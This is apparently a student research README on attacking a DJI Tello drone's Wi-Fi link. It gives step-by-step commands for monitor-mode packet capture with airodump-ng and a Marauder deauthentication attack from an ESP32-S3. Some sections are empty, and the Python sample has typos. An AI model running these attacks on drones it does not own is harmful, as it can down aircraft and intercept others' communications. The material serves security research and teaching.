# UAVHacking

A NASA-funded project conducted through the GVSU College of Computing. 
 
Cybersecurity research on UAV communications. Conduct reconnaissance. Exploit vulnerabilities. Take control.

---

By Brendan Lewis - Grand Valley State University BS. Cybersecurity

---
## 1. Abstract

This project will focus on researching and exploiting vulnerabilities in UAV communications. Preliminary research shows that UAVs are being used for personal and military applications. An increase in the number of UAVs increases the attack surface for drone communication. Hackers can passively eavesdrop on Air to Ground (A2G) and Ground to Air (G2A) communications, and they can uncover important telemetry data that can be used to locate and attack the UAV. Furthermore, an active attack, such as GPS spoofing, can mislead the drone's sensors and cause it to crash or fly in an unrestricted area.

By conducting this research, we hope to investigate _why_ drone communication has such a large attack surface, and exploit these vulnerabilities in real time using a DJI Tello drone and an ESP32-S3 running Marauder. 

--
### Reference:

<img width="708" height="413" alt="image" src="https://github.com/user-attachments/assets/6c33783b-7073-4c6d-adf9-bf6469562618" />


---

## 2. Requirements

### Hardware

- DJI Tello drone
- ESP32-S3
- ALFA AWUS036ACH USB Wi-Fi Adapter
- Raspberry Pi Pico
- MacOS, Windows, or Linux machine

### Software

- FZEEFlasher
- Marauder
- Djitellopy
- Wireshark
- aircrack-ng

---
## 3. Getting Started

### Connecting to the DJI Tello for the first time.

1. Download the DJI Tello mobile application.
2. Press the power button on the side of the drone.
3. Connect to the Tello-xxxxx network from your device's Wi-Fi settings menu.
4. Open the Tello App.

### Flashing Marauder on the ESP32-S3

There are a few ways to do this, but I've found FZEEFlasher is the easiest and most convenient. This guide follows only macOS for now. 

1. Plug in your ESP32-S3 to your computer via USB.

 Note: You must use the USB Type-C **USB & OTG** port.

2. To verify your device is connected fun the command:

```bash
lsusb
```

 Note: This should be something like /dev/cu.usbmodemxxxx on macOS.

3. Open FZEEFlasher: https://fzeeflasher.com/index.html

- Connect → select ESP32-S3

- Hardware: ESP32-S3 Multimedia Board

- Version: 1.8.3

- Select: Marauder → Flash

4. Once the flashing has completed. Unplug the ESP32-S3 for 5 seconds and plug it into the USB Type-C **USB to Serial** port.

5. Open the serial terminal
   
6. Using FZEEFlasher, connect to the serial port.

Note: Should be something like /dev/cu.usbmodemxxxxxxxxxxxx. Different from the first time.

9. Interact with Marauder and verify its working.

```bash
scanap
```

This will show all available networks within range of the device. 

---
## 4. Remotely Controlling the DJI Tello 

To remotely control the DJI Tello, we will use the DJI Tello SDK. [Tello SDK](https://dl-cdn.ryzerobotics.com/downloads/tello/20180910/Tello%20SDK%20Documentation%20EN_1.3.pdf)

1. Open your favorite IDE, in this example, Visual Studio Code.

2. In the terminal, clone the djitellopy repository.

```bash
git clone https://github.com/damiafuentes/DJITelloPy.git
cd DJITelloPy
pip install -e .
```

3. Install the requirements.

```bash
pip install -r requirements.txt
```

4. Create a new .py file. _Tello_testing.py_

```python

from djitellpy import tello
import time

drone = tello.Tello()
drone.connect()

print(f"Battery: {tello.get_battery()}%")

drone.takeoff()
time.sleep(2)

drone.move_forward(50)
time.sleep(2)

drone.move_backward(50)
time.sleep(2)

drone.land()
time.sleep(2)

drone.disconnect()
```

5. Run the script.

```bash
python3 tello_testing.py
```

---

## 5. Setting up the Attacker VM

### Kali Linux Setup

1. Download and install VirtualBox

https://www.virtualbox.org/

2. Create a new VM with Kali Linux

3. Enable USB 3.0 xHCi for USB Passthrough

4. After you boot, it's a good idea to update

```
sudo apt update && upgrade -y
```

--

### ALFA AWUS036ACH USB Wi-Fi Adapter

1. Plug in the ALFA USB adapter and ensure it is connected

```
lsusb
```
- You should see a Realtek RTL88**AU adapter

2. Update and get the official driver

https://docs.alfa.com.tw/Product/AWUS036ACH/

```
cd /tmp
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au
```

3. dkms installation

```
make dkms_install
```

4. Load kernel module

```
modprobe 8812au
```

5. List the wireless devices to verify

```
iw dev
```

#### Set the USB Wi-Fi Adapter to Monitor Mode

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0   # replace wlan0 with the real device name if different
iw dev                       # confirm monitor device (e.g., wlan0mon)
             
```
---
---
## 6. Configure the Raspberry Pi Pico




---
## Passive attacks

--
### 1. Sniffing and Packet Capture

_This section assumes your USB Wi-Fi adapter is in monitor mode._

1. Discover networks
```
airodump-ng <network-interface>
```
- Replace <network-interface> with your wireless adapter (i.e. wlan0mon)

2. Capture packets on the specified APs 
```
airodump-ng --bssid <target-AP-BSSID> -c <channel> -w <file> wlan0mon
```
- Captures traffic and writes the output to a file

3. (Optional) Analyze these packets with _analyze_tello_captures.py_


---

## Active Attacks

---

### 1. Using the ESP32-S3 to Deauthenticate the Tello's Wi-Fi connection

1. Connect your ESP32-S3 to the serial terminal.
    (Optional) - Run 'help' to see a list of commands

2. Scan the available Access Points
```
scanap
```
Note: Use 'stopscan' to stop any currently running WiFi/Bluetooth scan/attack.

3. Identify the index of the drone and add it to the list.

```
select -a <index>
```

4. Confirm the correct index was selected

```
list -a
```

5. Deauthenticate the APs in the list (only intended for educational purposes)

```
attack -t deauth
```

6. Stop the attack

```
stopscan
```
--

### 2. 



---
## 8. Possible Attacks with this configuration



---

## Disclaimer

This project is for educational and research purposes only.
Do not use these techniques against devices you do not own or without explicit authorization.

---

## References

- [Tengu Marauder](https://github.com/Lexicon121/Tengu-Marauder/blob/main/Guides/Workshop.md)
- [Djitellopy](https://github.com/damiafuentes/DJITelloPy)
- [Tello SDK](https://dl-cdn.ryzerobotics.com/downloads/tello/20180910/Tello%20SDK%20Documentation%20EN_1.3.pdf)
- [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder)
- [FZEEFlasher](https://fzeeflasher.com/index.html)
- [Espressif ESP32-S3 Documentation](https://docs.espressif.com/projects/esptool/en/latest/esp32s3/installation.html)
- [Espressif Serial Connection](https://docs.espressif.com/projects/esp-idf/en/stable/esp32s3/get-started/establish-serial-connection.html)
- [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=Main)
- [VirtualBox](https://www.virtualbox.org/)
- [Wireshark](https://www.wireshark.org/)

  
